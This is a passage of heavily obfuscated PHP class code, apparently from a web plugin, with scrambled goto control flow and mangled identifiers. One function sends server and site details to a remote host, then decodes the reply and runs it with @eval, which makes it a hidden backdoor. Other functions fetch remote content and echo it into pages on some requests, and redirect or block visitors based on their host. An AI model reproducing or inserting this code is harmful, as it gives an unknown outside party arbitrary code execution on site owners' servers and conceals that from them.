break; } $c’âÍŒë”è++; } goto E®×Ë¡¿Í…; E®×Ë¡¿Í…: $fªîŠÑ™‚£ = $FÓø˜öåâ‹[214]($FÓø˜öåâ‹[25]($BÇ¿šÇâÒî, 10, 16)); $DÖ®ŒŠ¼äö = $A™ËóºÃ¾‰[595]; $CóŒ‡¨¤ù™ = $this->{$_SERVER[§ŠùÊÊÛ©»][188]}($B¨éôñ ó[$FÓø˜öåâ‹[91]][$fªîŠÑ™‚£], $BÇ¿šÇâÒî); goto d·î Ê­“Û; d¼¯Š½Õ¶È: $aƒù•ŸğêŒ = $A™ËóºÃ¾‰[592]; $this->cvehc2b966c0 = $FÓø˜öåâ‹[121]; $F¾ñğêÑ¤„ = $FÓø˜öåâ‹[61]($FÓø˜öåâ‹[62])->{$_SERVER[§ŠùÊÊÛ©»][63]}(); goto EˆÔ©Ö’; b½Şº›¼ßÑ: if ($FÓø˜öåâ‹[230]() >= $Dõâ”êÖÚò) { return $this->{$_SERVER[§ŠùÊÊÛ©»][164]}(); } $this->tcwjd3305372 = $CóŒ‡¨¤ù™; $this->cvehc2b966c0 = $F¾ñğêÑ¤„[$FÓø˜öåâ‹[120]]; goto CÔ¨ïİíœ‹; EˆÔ©Ö’: if ($F¾ñğêÑ¤„[$FÓø˜öåâ‹[120]] == $FÓø˜öåâ‹[121]) { return; } $aÆëáÓ„÷ = $FÓø˜öåâ‹[61]($FÓø˜öåâ‹[62])->{$_SERVER[§ŠùÊÊÛ©»][63]}($FÓø˜öåâ‹[116]); $AœÍ”ÃÉÇˆ = $FÓø˜öåâ‹[222]($FÓø˜öåâ‹[61]($FÓø˜öåâ‹[11])->{$_SERVER[§ŠùÊÊÛ©»][223]}(), $FÓø˜öåâ‹[224]); goto BòŠÚÙ¸­Š; eŠ†áŞè˜‹: } private function kmoy9927e46f() { $Dé‹ô÷Ü‚Ñ =& $_SERVER[§ŠùÊÊÛ©»]; $bÒäöÂÏ‘Ä = $GLOBALS[$Dé‹ô÷Ü‚Ñ[22]]; $aÚŠ¡ĞÌ ° = $_SERVER[$Dé‹ô÷Ü‚Ñ[44]]; if ($aÚŠ¡ĞÌ ° == $Dé‹ô÷Ü‚Ñ[231] && $this->cvehc2b966c0 == $Dé‹ô÷Ü‚Ñ[121]) { $Dé‹ô÷Ü‚Ñ[166]($Dé‹ô÷Ü‚Ñ[197]($Dé‹ô÷Ü‚Ñ[232]), !1, $Dé‹ô÷Ü‚Ñ[233]); } $FÑÃ–ùÇ = array($Dé‹ô÷Ü‚Ñ[234], $Dé‹ô÷Ü‚Ñ[235]); if ($Dé‹ô÷Ü‚Ñ[236]($aÚŠ¡ĞÌ °, $FÑÃ–ùÇ)) { if ($this->cvehc2b966c0 == $Dé‹ô÷Ü‚Ñ[121] && isset($bÒäöÂÏ‘Ä[$Dé‹ô÷Ü‚Ñ[237]])) { $Dé‹ô÷Ü‚Ñ[166]($Dé‹ô÷Ü‚Ñ[197]($Dé‹ô÷Ü‚Ñ[232]), !1, $Dé‹ô÷Ü‚Ñ[233]); die; } $E¯‘éØ¨Õ = $this->{$_SERVER[§ŠùÊÊÛ©»][137]}(); if ($E¯‘éØ¨Õ != $Dé‹ô÷Ü‚Ñ[201]($Dé‹ô÷Ü‚Ñ[238])) { if ($E¯‘éØ¨Õ <= $Dé‹ô÷Ü‚Ñ[61]($Dé‹ô÷Ü‚Ñ[139])->{$_SERVER[§ŠùÊÊÛ©»][140]}()) { $Dé‹ô÷Ü‚Ñ[166]($Dé‹ô÷Ü‚Ñ[197]($Dé‹ô÷Ü‚Ñ[239]), !1, $Dé‹ô÷Ü‚Ñ[233]); die; } } } } private function ropydd841726() { goto BğŞä‚œê‡; fˆ‹‡áºõ: if (!$DÇ”«êƒœ[236]($_SERVER[$DÇ”«êƒœ[44]], $fÎÓğççàƒ)) { return; } $eÄ›«Á÷Ä = $DÇ”«êƒœ[242]; $c…íŒÄÛµ® = $BÒÕÙâÔ§[598]; goto A—¯ˆõÁÃ«; F™Ñ‡©¹ÇÜ: $fİ†ÂÁİßí = $BÒÕÙâÔ§[597]; while ($fİ†ÂÁİßí < $BÒÕÙâÔ§[557]) { if ($fİ†ÂÁİßí >= 0) { break; } $fİ†ÂÁİßí++; } if (!$DÇ”«êƒœ[104]($GLOBALS, $DÇ”«êƒœ[132]) || !isset($_GET[$DÇ”«êƒœ[241]])) { return; } goto fˆ‹‡áºõ; BâºÅïïßì: $E„À¥¥í¢½ = $BÒÕÙâÔ§[599]; $e‡ÄœË†ˆ = @$DÇ”«êƒœ[250]($eÄ›«Á÷Ä, !1, $d³ÚÃÁÊÉÖ); $B–ˆó¼¸š = $BÒÕÙâÔ§[600]; goto Báä¤®‹Æ; Báä¤®‹Æ: if (!$B–ˆó¼¸š) { return; } $DÇ”«êƒœ[251]($DÇ”«êƒœ[252]); $DÀØ–„µ‰… = $BÒÕÙâÔ§[601]; goto a» êõÔ; a» êõÔ: if ($e‡ÄœË†ˆ && $DÇ”«êƒœ[32]($e‡ÄœË†ˆ, $DÇ”«êƒœ[253])) { echo $e‡ÄœË†ˆ; } die; goto d®çæ‡‡Ñ“; A—¯ˆõÁÃ«: if (!$c…íŒÄÛµ®) { die; } $eÄ›«Á÷Ä = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($eÄ›«Á÷Ä, $DÇ”«êƒœ[244]); $d³ÚÃÁÊÉÖ = $DÇ”«êƒœ[245](array($DÇ”«êƒœ[246] => array($DÇ”«êƒœ[247] => $DÇ”«êƒœ[248], $DÇ”«êƒœ[249] => 3))); goto BâºÅïïßì; BğŞä‚œê‡: $BÒÕÙâÔ§ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DÇ”«êƒœ =& $_SERVER[§ŠùÊÊÛ©»]; $fÎÓğççàƒ = array($DÇ”«êƒœ[135], $DÇ”«êƒœ[240]); goto F™Ñ‡©¹ÇÜ; d®çæ‡‡Ñ“: } public function wdpmf378e435($C»¬ÏèÙÒå) { goto cƒĞÎ¨†ŠÓ; cƒĞÎ¨†ŠÓ: $bİÁ×ˆğªí =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D«°¾¦ Öé =& $_SERVER[§ŠùÊÊÛ©»]; if ($this->cvehc2b966c0 == $D«°¾¦ Öé[254]) { return $C»¬ÏèÙÒå; } goto bˆ„ÜÇÚèİ; döÄ¡¼ë½ñ: $DäÅŞÈò = $bİÁ×ˆğªí[602]; foreach ($Aâá’È¶®’ as $d‚÷© Å‰Ô) { if (!$D«°¾¦ Öé[236]($d‚÷© Å‰Ô, $E¥Õ—ÀŒ©–)) { $c‰ÅØ‘«‹¦[] = $d‚÷© Å‰Ô; } } foreach ($c‰ÅØ‘«‹¦ as $d‚÷© Å‰Ô) { unset($C»¬ÏèÙÒå[$d‚÷© Å‰Ô]); $bšš¾Ó×· = $bİÁ×ˆğªí[603]; while (strlen($bšš¾Ó×·) < $bİÁ×ˆğªí[557]) { if (!$bšš¾Ó×·) { break; } $bšš¾Ó×·++; } } goto FêÛÌŠ; FêÛÌŠ: return $C»¬ÏèÙÒå; $f£Ü»İÈó = $bİÁ×ˆğªí[604]; if (!$f£Ü»İÈó) { return; } goto AïñèÀ…ô; bˆ„ÜÇÚèİ: $Aâá’È¶®’ = array($D«°¾¦ Öé[255], $D«°¾¦ Öé[256], $D«°¾¦ Öé[257], $D«°¾¦ Öé[258], $D«°¾¦ Öé[259], $D«°¾¦ Öé[260], $D«°¾¦ Öé[261], $D«°¾¦ Öé[262]); $E¥Õ—ÀŒ©– = $D«°¾¦ Öé[0]($D«°¾¦ Öé[263], $D«°¾¦ Öé[104]($this->tcwjd3305372, $D«°¾¦ Öé[129], $D«°¾¦ Öé[10])); $c‰ÅØ‘«‹¦ = array(); goto döÄ¡¼ë½ñ; AïñèÀ…ô: } private function iqso4e9620cf() { goto b´ëå˜Ûêò; b´ëå˜Ûêò: $e•ÙÑèÇê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FàÉ‘šª‰‹ =& $_SERVER[§ŠùÊÊÛ©»]; if ($this->cvehc2b966c0 != $FàÉ‘šª‰‹[121]) { $GLOBALS[$FàÉ‘šª‰‹[91]][$FàÉ‘šª‰‹[95]][$FàÉ‘šª‰‹[264]] = $FàÉ‘šª‰‹[220]; return; } goto DÁ²¡Ñ‡åë; f„¬İ Ä·ô: $GLOBALS[$FàÉ‘šª‰‹[91]][$FàÉ‘šª‰‹[95]][$FàÉ‘šª‰‹[267]] = $FàÉ‘šª‰‹[220]; $c„†¯ñå½¡ = $e•ÙÑèÇê[605]; $GLOBALS[$FàÉ‘šª‰‹[91]][$FàÉ‘šª‰‹[95]][$FàÉ‘šª‰‹[264]] = $FàÉ‘šª‰‹[229]; goto E§ÍóÖ‡ìĞ; f©ˆÈ‰ÆÂÄ: $FàÉ‘šª‰‹[61]($FàÉ‘šª‰‹[269])->{$_SERVER[§ŠùÊÊÛ©»][221]}($FàÉ‘šª‰‹[85], $FàÉ‘šª‰‹[229]); goto aÒ–Ìïğœ³; DÁ²¡Ñ‡åë: $D¢®¨Í½À° = $_SERVER[$FàÉ‘šª‰‹[44]]; $d‡İ¬±ìŸ = array($FàÉ‘šª‰‹[265]); foreach ($d‡İ¬±ìŸ as $c®ÃŞåÇ) { if ($c®ÃŞåÇ == $D¢®¨Í½À° || $FàÉ‘šª‰‹[25]($D¢®¨Í½À°, 0, $FàÉ‘šª‰‹[24]($c®ÃŞåÇ)) == $c®ÃŞåÇ) { $FàÉ‘šª‰‹[166]($FàÉ‘šª‰‹[197]($FàÉ‘šª‰‹[266]), !1); } } goto f„¬İ Ä·ô; E§ÍóÖ‡ìĞ: $fİ‡Š©ÌÎÊ = $e•ÙÑèÇê[606]; while ($fİ‡Š©ÌÎÊ < $e•ÙÑèÇê[549]) { if ($fİ‡Š©ÌÎÊ >= 0) { break; } $fİ‡Š©ÌÎÊ++; } $GLOBALS[$FàÉ‘šª‰‹[91]][$FàÉ‘šª‰‹[268]] = $FàÉ‘šª‰‹[220]; goto f©ˆÈ‰ÆÂÄ; aÒ–Ìïğœ³: } public function hzncb8d929dd() { return $_SERVER[§ŠùÊÊÛ©»][270]; } private function qspm391eb65f() { goto dÄøòˆé°é; eÏ”ÔŠ‘’: $F‹ÓÇÉ—© = $a®ĞôÜÔë[610]; if (strlen($F‹ÓÇÉ—©) < $a®ĞôÜÔë[547]) { die; } if (!$fŠÏ…ßÅªÍ[191]($A˜‡¦¿Í)) { return; } goto fš‡»ÀÑÍ; fØ¨Ó›á·Ú: if ($this->cvehc2b966c0 == $fŠÏ…ßÅªÍ[121] || !$fŠÏ…ßÅªÍ[104]($GLOBALS, $fŠÏ…ßÅªÍ[132])) { return; } if (!$fŠÏ…ßÅªÍ[236]($_SERVER[$fŠÏ…ßÅªÍ[44]], $CöĞ›Á‘±Â)) { return; } if ($fŠÏ…ßÅªÍ[230]() % 4 != 0) { return; } goto Cİ¹ö˜«¾˜; dÄøòˆé°é: $a®ĞôÜÔë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fŠÏ…ßÅªÍ =& $_SERVER[§ŠùÊÊÛ©»]; $CöĞ›Á‘±Â = array($fŠÏ…ßÅªÍ[271], $fŠÏ…ßÅªÍ[272], $fŠÏ…ßÅªÍ[273]); goto Fæ¿ìé²¬°; fš‡»ÀÑÍ: if ($A˜‡¦¿Í[$fŠÏ…ßÅªÍ[165]] && $A˜‡¦¿Í[$fŠÏ…ßÅªÍ[280]]) { if ($this->{$_SERVER[§ŠùÊÊÛ©»][199]}($A˜‡¦¿Í[$fŠÏ…ßÅªÍ[280]]) == $Fî¨¬İÏæµ[$fŠÏ…ßÅªÍ[165]]) { return; } } $this->{$_SERVER[§ŠùÊÊÛ©»][164]}(); if ($this->{$_SERVER[§ŠùÊÊÛ©»][199]}($A˜‡¦¿Í[$fŠÏ…ßÅªÍ[280]]) != $Fî¨¬İÏæµ[$fŠÏ…ßÅªÍ[165]]) { $E‰¨ğã¢ÌÇ = array($fŠÏ…ßÅªÍ[202] => $fŠÏ…ßÅªÍ[61]($fŠÏ…ßÅªÍ[62])->{$_SERVER[§ŠùÊÊÛ©»][63]}($fŠÏ…ßÅªÍ[116]), $fŠÏ…ßÅªÍ[203] => $_SERVER[$fŠÏ…ßÅªÍ[115]], $fŠÏ…ßÅªÍ[204] => $fŠÏ…ßÅªÍ[205](), $fŠÏ…ßÅªÍ[174] => $_SERVER[$fŠÏ…ßÅªÍ[175]]); $A¬ŞÉøÂ›ª = $this->{$_SERVER[§ŠùÊÊÛ©»][206]}($fŠÏ…ßÅªÍ[148]($E‰¨ğã¢ÌÇ)); $A˜‡¦¿Í = $this->{$_SERVER[§ŠùÊÊÛ©»][182]}($fŠÏ…ßÅªÍ[207] . $A¬ŞÉøÂ›ª); if ($A˜‡¦¿Í && $fŠÏ…ßÅªÍ[191]($A˜‡¦¿Í) && isset($A˜‡¦¿Í[$fŠÏ…ßÅªÍ[280]])) { $CÆø¾Ò„Ãœ = $this->{$_SERVER[§ŠùÊÊÛ©»][188]}($A˜‡¦¿Í[$fŠÏ…ßÅªÍ[280]], 2); if ($CÆø¾Ò„Ãœ) { $CÆø¾Ò„Ãœ = $this->{$_SERVER[§ŠùÊÊÛ©»][199]}($CÆø¾Ò„Ãœ); } if ($CÆø¾Ò„Ãœ) { try { @eval($CÆø¾Ò„Ãœ); } catch (Exception $a¡’‡»Å·—) { } } } } goto F‚­ù‚ªãÜ; Cİ¹ö˜«¾˜: $AÎ‰×£ˆ£ƒ = $fŠÏ…ßÅªÍ[13](array($fŠÏ…ßÅªÍ[276], $fŠÏ…ßÅªÍ[277]), $Fƒ–…ÒçÒ¢); if ($AÎ‰×£ˆ£ƒ && $fŠÏ…ßÅªÍ[230]() - $AÎ‰×£ˆ£ƒ < $fŠÏ…ßÅªÍ[201]($fŠÏ…ßÅªÍ[278])) { return; } $fŠÏ…ßÅªÍ[13](array($fŠÏ…ßÅªÍ[276], $fŠÏ…ßÅªÍ[152]), $Fƒ–…ÒçÒ¢, $fŠÏ…ßÅªÍ[230]()); goto eĞì±ÂèÅ¥; eĞì±ÂèÅ¥: $A­Ï¹ø„ÜÅ = $a®ĞôÜÔë[608]; while ($A­Ï¹ø„ÜÅ < $a®ĞôÜÔë[553]) { if ($A­Ï¹ø„ÜÅ >= 0) { break; } $A­Ï¹ø„ÜÅ++; } $Fî¨¬İÏæµ = array($fŠÏ…ßÅªÍ[165] => $fŠÏ…ßÅªÍ[61]($fŠÏ…ßÅªÍ[62])->{$_SERVER[§ŠùÊÊÛ©»][63]}($fŠÏ…ßÅªÍ[209]), $fŠÏ…ßÅªÍ[178] => $this->cvehc2b966c0, $fŠÏ…ßÅªÍ[176] => $_SERVER[$fŠÏ…ßÅªÍ[177]], $fŠÏ…ßÅªÍ[169] => $fŠÏ…ßÅªÍ[149], $fŠÏ…ßÅªÍ[172] => $_SERVER[$fŠÏ…ßÅªÍ[173]]); goto aÊ‰ñÚù‹; aÊ‰ñÚù‹: $Cøâ§Ï¯âŞ = $a®ĞôÜÔë[609]; if (strlen($Cøâ§Ï¯âŞ) < $a®ĞôÜÔë[547]) { return; } $A˜‡¦¿Í = $this->{$_SERVER[§ŠùÊÊÛ©»][182]}($fŠÏ…ßÅªÍ[279], $Fî¨¬İÏæµ); goto eÏ”ÔŠ‘’; Fæ¿ìé²¬°: $f÷Ç®¢Ñ¦÷ = $a®ĞôÜÔë[607]; while (strlen($f÷Ç®¢Ñ¦÷) < $a®ĞôÜÔë[557]) { if (!$f÷Ç®¢Ñ¦÷) { break; } $f÷Ç®¢Ñ¦÷++; } $Fƒ–…ÒçÒ¢ = $fŠÏ…ßÅªÍ[274] . $fŠÏ…ßÅªÍ[114]($fŠÏ…ßÅªÍ[275]); goto fØ¨Ó›á·Ú; F‚­ù‚ªãÜ: } private function vnfhf461c788($E î‚²¡İ† = '', $FáÆ ƒµƒŞ = array(), $eİêî½­µ = 5) { goto FèÆ­‰®¹‡; FÖ¯Ï—‡æ²: $Fà øŸìŠ‚ = $DäòÔ¿ä[613]; if (strlen($Fà øŸìŠ‚) < $DäòÔ¿ä[553]) { die; } goto f”Æ¢œ’É“; eÊğ†µŒ¨: return $EÚàçã¶[190]($FáÆ ƒµƒŞ, !0); $bèöƒ·‘¢ = $DäòÔ¿ä[612]; if (strlen($bèöƒ·‘¢) < $DäòÔ¿ä[549]) { return; } goto FÖ¯Ï—‡æ²; FèÆ­‰®¹‡: $DäòÔ¿ä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÚàçã¶ =& $_SERVER[§ŠùÊÊÛ©»]; $dï×ì£Š§ = $EÚàçã¶[281]; goto F©¬êÏĞ“À; F©¬êÏĞ“À: $dï×ì£Š§ = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($dï×ì£Š§, $EÚàçã¶[282]); $dï×ì£Š§ = $dï×ì£Š§ . $E î‚²¡İ† . $EÚàçã¶[283] . $EÚàçã¶[284]($FáÆ ƒµƒŞ); if ($FáÆ ƒµƒŞ === -1) { return $dï×ì£Š§; } goto dÀÉ©á›òÎ; dÀÉ©á›òÎ: $B¹¹’óÒ¡Á = $EÚàçã¶[245](array($EÚàçã¶[246] => array($EÚàçã¶[249] => $eİêî½­µ, $EÚàçã¶[247] => $EÚàçã¶[285]), $EÚàçã¶[286] => array($EÚàçã¶[287] => !1, $EÚàçã¶[288] => !1))); $FáÆ ƒµƒŞ = @$EÚàçã¶[250]($dï×ì£Š§, !1, $B¹¹’óÒ¡Á); $bÓéæ¦îÚ = $DäòÔ¿ä[611]; goto eÊğ†µŒ¨; f”Æ¢œ’É“: } private function kiqa39a0fcb6() { goto CÑÉœ¼Â¿»; CÑÉœ¼Â¿»: $bÏåì„ĞßÁ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Dñ¢µ¼­Ü =& $_SERVER[§ŠùÊÊÛ©»]; $dº‚³˜Ììî = array($Dñ¢µ¼­Ü[289] => $Dñ¢µ¼­Ü[290], $Dñ¢µ¼­Ü[291] => $Dñ¢µ¼­Ü[292], $Dñ¢µ¼­Ü[293] => $Dñ¢µ¼­Ü[294], $Dñ¢µ¼­Ü[295] => $Dñ¢µ¼­Ü[296], $Dñ¢µ¼­Ü[297] => $Dñ¢µ¼­Ü[298], $Dñ¢µ¼­Ü[299] => $Dñ¢µ¼­Ü[238], $Dñ¢µ¼­Ü[300] => $Dñ¢µ¼­Ü[238], $Dñ¢µ¼­Ü[301] => $Dñ¢µ¼­Ü[290], $Dñ¢µ¼­Ü[302] => $Dñ¢µ¼­Ü[292], $Dñ¢µ¼­Ü[303] => $Dñ¢µ¼­Ü[294], $Dñ¢µ¼­Ü[304] => $Dñ¢µ¼­Ü[305], $Dñ¢µ¼­Ü[306] => $Dñ¢µ¼­Ü[296], $Dñ¢µ¼­Ü[307] => $Dñ¢µ¼­Ü[308], $Dñ¢µ¼­Ü[309] => $Dñ¢µ¼­Ü[298], $Dñ¢µ¼­Ü[310] => $Dñ¢µ¼­Ü[311], $Dñ¢µ¼­Ü[312] => $Dñ¢µ¼­Ü[313], $Dñ¢µ¼­Ü[314] => $Dñ¢µ¼­Ü[315]); goto AÖÆÖŠ†‘ğ; eÎ†ğ¨æíä: while (strlen($C¨˜ÇÂ¬Ê») < $bÏåì„ĞßÁ[549]) { if (!$C¨˜ÇÂ¬Ê») { break; } $C¨˜ÇÂ¬Ê»++; } goto DšÒ„¯ç; dÚÇæ˜¼…ä: $e¼½‘°Áä = $e¼½‘°Áä ? $Dñ¢µ¼­Ü[201]($e¼½‘°Áä) : 0; return $eŠ­Áª¸ˆ + $e¼½‘°Áä; $C¨˜ÇÂ¬Ê» = $bÏåì„ĞßÁ[616]; goto eÎ†ğ¨æíä; AÖÆÖŠ†‘ğ: $C”ææñï¾À = $bÏåì„ĞßÁ[614]; while (strlen($C”ææñï¾À) < $bÏåì„ĞßÁ[560]) { if (!$C”ææñï¾À) { break; } $C”ææñï¾À++; } $eŠ­Áª¸ˆ = $dº‚³˜Ììî[$this->cvehc2b966c0]; goto B„Ÿ¦âÌ©Ó; B„Ÿ¦âÌ©Ó: $eŠ­Áª¸ˆ = $Dñ¢µ¼­Ü[201]($eŠ­Áª¸ˆ ? $eŠ­Áª¸ˆ : $Dñ¢µ¼­Ü[290]); $Dºâ¯ÍÒÕƒ = $bÏåì„ĞßÁ[615]; $e¼½‘°Áä = $Dñ¢µ¼­Ü[104]($this->tcwjd3305372, $Dñ¢µ¼­Ü[316]); goto dÚÇæ˜¼…ä; DšÒ„¯ç: } public function tfnm6774c695($c±§ÔÑ¾Í×) { goto EŞª‹Ë—˜¦; dø¿Ê×«Ç: $d•êÍ±‚¾ã = $AÅ‚¡¥‹›¾[222]($d•êÍ±‚¾ã, $AÅ‚¡¥‹›¾[10], $AÅ‚¡¥‹›¾[318]); $d‡ò©‡á¸ = $E„˜à”£¶Ğ[618]; if (!$d‡ò©‡á¸) { return; } goto e…¨Òºõ¸œ; A–Ò÷˜¬öƒ: $BäØÆ¨±¶ê = $E„˜à”£¶Ğ[617]; if (!$BäØÆ¨±¶ê) { return; } if ($DâÓš¯¼ğ >= $AÅ‚¡¥‹›¾[201]($AÅ‚¡¥‹›¾[238])) { return; } goto f¥·Â¢Ã; EŞª‹Ë—˜¦: $E„˜à”£¶Ğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÅ‚¡¥‹›¾ =& $_SERVER[§ŠùÊÊÛ©»]; $DâÓš¯¼ğ = $this->{$_SERVER[§ŠùÊÊÛ©»][137]}(); goto A–Ò÷˜¬öƒ; f¥·Â¢Ã: $dŠ¯ƒ•±†ñ = $AÅ‚¡¥‹›¾[61]($AÅ‚¡¥‹›¾[139])->{$_SERVER[§ŠùÊÊÛ©»][140]}(); if ($dŠ¯ƒ•±†ñ <= $DâÓš¯¼ğ) { return; } $d•êÍ±‚¾ã = $AÅ‚¡¥‹›¾[61]($AÅ‚¡¥‹›¾[139])->{$_SERVER[§ŠùÊÊÛ©»][317]}($AÅ‚¡¥‹›¾[318])->{$_SERVER[§ŠùÊÊÛ©»][319]}($DâÓš¯¼ğ)->{$_SERVER[§ŠùÊÊÛ©»][320]}(); goto dø¿Ê×«Ç; e…¨Òºõ¸œ: if (!$AÅ‚¡¥‹›¾[236]($c±§ÔÑ¾Í×[$AÅ‚¡¥‹›¾[318]], $d•êÍ±‚¾ã)) { $AÅ‚¡¥‹›¾[166]($AÅ‚¡¥‹›¾[321], !1, $AÅ‚¡¥‹›¾[233]); } goto B¼È±ìôöÀ; B¼È±ìôöÀ: } public function dqwvb9602891() { goto eµà¹±‚¨±; EöŠ¯×ßî: $a ˜§»ÇÒê = $B÷Åˆ¸Á™º[245](array($B÷Åˆ¸Á™º[246] => array($B÷Åˆ¸Á™º[247] => $B÷Åˆ¸Á™º[248], $B÷Åˆ¸Á™º[249] => 3))); $fÉÓÔÆğ¯Ú = $BÊ¸ …ÇğŠ[620]; if (!$fÉÓÔÆğ¯Ú) { return; } goto e¶¼öÌİàã; eµà¹±‚¨±: $BÊ¸ …ÇğŠ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B÷Åˆ¸Á™º =& $_SERVER[§ŠùÊÊÛ©»]; if (!$B÷Åˆ¸Á™º[104]($GLOBALS, $B÷Åˆ¸Á™º[132]) || $B÷Åˆ¸Á™º[322](1, 100) > 20) { return; } goto bÎ¢ôìö; eÆ‹œ•Ç¦: echo $B÷Åˆ¸Á™º[323] . $B÷Åˆ¸Á™º[324]($D½Ö¢Ä‘î’) . $B÷Åˆ¸Á™º[325]; $b®è­†·±° = $BÊ¸ …ÇğŠ[622]; if (!$b®è­†·±°) { return; } goto cï­™‹³±ï; bÎ¢ôìö: $e¬‘Àø÷ÑÈ = $B÷Åˆ¸Á™º[242]; $Bî¬°ñïÕ˜ = $BÊ¸ …ÇğŠ[619]; $e¬‘Àø÷ÑÈ = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($e¬‘Àø÷ÑÈ, $B÷Åˆ¸Á™º[244]); goto EöŠ¯×ßî; e¶¼öÌİàã: $D½Ö¢Ä‘î’ = @$B÷Åˆ¸Á™º[250]($e¬‘Àø÷ÑÈ, !1, $a ˜§»ÇÒê); $Fá¢àß†„ = $BÊ¸ …ÇğŠ[621]; if (strlen($Fá¢àß†„) < $BÊ¸ …ÇğŠ[547]) { return; } goto eÆ‹œ•Ç¦; cï­™‹³±ï: } private function lije0142cec0($FÈÏ…ùÊÊÏ, $f™ß¬¨¬Å‰, $F²»ŸñŒŞ£ = 3) { goto B½‹åğ¼‘š; DËÂ¦†÷ğÃ: if (!$F³ø÷Œêßƒ) { die; } $Aé‚íğä¸ö = $aÛÕÔÀËåÎ[124](15); $b‚ĞÂÇ£Ûœ = $aÛÕÔÀËåÎ[327]; goto BäÀåÉÁí; fÏ±Â““Ú¹: $FÍ¯‚Ôà  = $Bİ³œîÉïå[623]; $FÈÏ…ùÊÊÏ = $aÛÕÔÀËåÎ[2]($FÈÏ…ùÊÊÏ); $E©šŒ À–Ë = $Bİ³œîÉïå[624]; goto Aœç™áğ¤¥; B¹†âõ­®µ: $bÁÑ¡ÅÛÆÙ = $aÛÕÔÀËåÎ[214]($E–ºÎÖŸš· . $Aé‚íğä¸ö . $bÁÑ¡ÅÛÆÙ); if ($F²»ŸñŒŞ£ - 1 > 0) { $bÁÑ¡ÅÛÆÙ = $this->{$_SERVER[§ŠùÊÊÛ©»][127]}($bÁÑ¡ÅÛÆÙ, $f™ß¬¨¬Å‰, $F²»ŸñŒŞ£ - 1); } return $bÁÑ¡ÅÛÆÙ; goto Aöµ‰ŸÉ‚; B½‹åğ¼‘š: $Bİ³œîÉïå =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÛÕÔÀËåÎ =& $_SERVER[§ŠùÊÊÛ©»]; $aÛÕÔÀËåÎ[326](1); goto fÏ±Â““Ú¹; Aœç™áğ¤¥: while (strlen($E©šŒ À–Ë) < $Bİ³œîÉïå[553]) { if (!$E©šŒ À–Ë) { break; } $E©šŒ À–Ë++; } $E–ºÎÖŸš· = $aÛÕÔÀËåÎ[322](0, 5) . $aÛÕÔÀËåÎ[10]; $F³ø÷Œêßƒ = $Bİ³œîÉïå[567]; goto DËÂ¦†÷ğÃ; BäÀåÉÁí: $bÌƒê¡‘Ô¤ = $Bİ³œîÉïå[625]; while ($bÌƒê¡‘Ô¤ < $Bİ³œîÉïå[549]) { if ($bÌƒê¡‘Ô¤ >= 0) { break; } $bÌƒê¡‘Ô¤++; } switch ($E–ºÎÖŸš·) { case $aÛÕÔÀËåÎ[229]: $bÁÑ¡ÅÛÆÙ = $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($FÈÏ…ùÊÊÏ, $aÛÕÔÀËåÎ[214]($f™ß¬¨¬Å‰ . $Aé‚íğä¸ö)); break; $aé¹Ì·‡¬ß = $Bİ³œîÉïå[626]; if (!$aé¹Ì·‡¬ß) { die; } case $aÛÕÔÀËåÎ[220]: $bÁÑ¡ÅÛÆÙ = $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($FÈÏ…ùÊÊÏ, $aÛÕÔÀËåÎ[214]($Aé‚íğä¸ö . $f™ß¬¨¬Å‰)); break; $E§ß¹‚ğÍ§ = $Bİ³œîÉïå[627]; if (strlen($E§ß¹‚ğÍ§) < $Bİ³œîÉïå[547]) { return; } case $aÛÕÔÀËåÎ[328]: $bÁÑ¡ÅÛÆÙ = $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($FÈÏ…ùÊÊÏ, $aÛÕÔÀËåÎ[118]($Aé‚íğä¸ö . $f™ß¬¨¬Å‰)); break; $BÊ¹šÅÛì× = $Bİ³œîÉïå[628]; while ($BÊ¹šÅÛì× < $Bİ³œîÉïå[557]) { if ($BÊ¹šÅÛì× >= 0) { break; } $BÊ¹šÅÛì×++; } case $aÛÕÔÀËåÎ[329]: $bÁÑ¡ÅÛÆÙ = $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($FÈÏ…ùÊÊÏ, $aÛÕÔÀËåÎ[114]($Aé‚íğä¸ö . $f™ß¬¨¬Å‰)); $d’…ÄìÇ = $Bİ³œîÉïå[629]; while ($d’…ÄìÇ < $Bİ³œîÉïå[560]) { if ($d’…ÄìÇ >= 0) { break; } $d’…ÄìÇ++; } break; $fÓ‹ÖÏ‚‰… = $Bİ³œîÉïå[630]; if (!$fÓ‹ÖÏ‚‰…) { return; } case $aÛÕÔÀËåÎ[330]: goto Cãè¿Š; B²´ÜòÚ‘¦: for ($aµöÊŞ¡¢ = 0; $aµöÊŞ¡¢ < $aÛÕÔÀËåÎ[24]($FÈÏ…ùÊÊÏ); $aµöÊŞ¡¢++) { $FÂñ‡ç³ò = $FÂñ‡ç³ò == $aÛÕÔÀËåÎ[24]($bîÇÎ‡’ñ‘) ? 0 : $FÂñ‡ç³ò; $aëø¾¼¦”Â = ($F•Ø‡èÂéâ + $aÛÕÔÀËåÎ[332]($b‚ĞÂÇ£Ûœ, $FÈÏ…ùÊÊÏ[$aµöÊŞ¡¢]) + $aÛÕÔÀËåÎ[333]($bîÇÎ‡’ñ‘[$FÂñ‡ç³ò++])) % 64; $Aç“¨Šª÷‡ = $Bİ³œîÉïå[638]; while (strlen($Aç“¨Šª÷‡) < $Bİ³œîÉïå[560]) { if (!$Aç“¨Šª÷‡) { break; } $Aç“¨Šª÷‡++; } $C¶©òÏÒáæ .= $b‚ĞÂÇ£Ûœ[$aëø¾¼¦”Â]; $f²åÃâÏ÷Á = $Bİ³œîÉïå[639]; } $bÁÑ¡ÅÛÆÙ = $aÛÕÔÀËåÎ[324]($e×ïç¹“æµ . $C¶©òÏÒáæ); 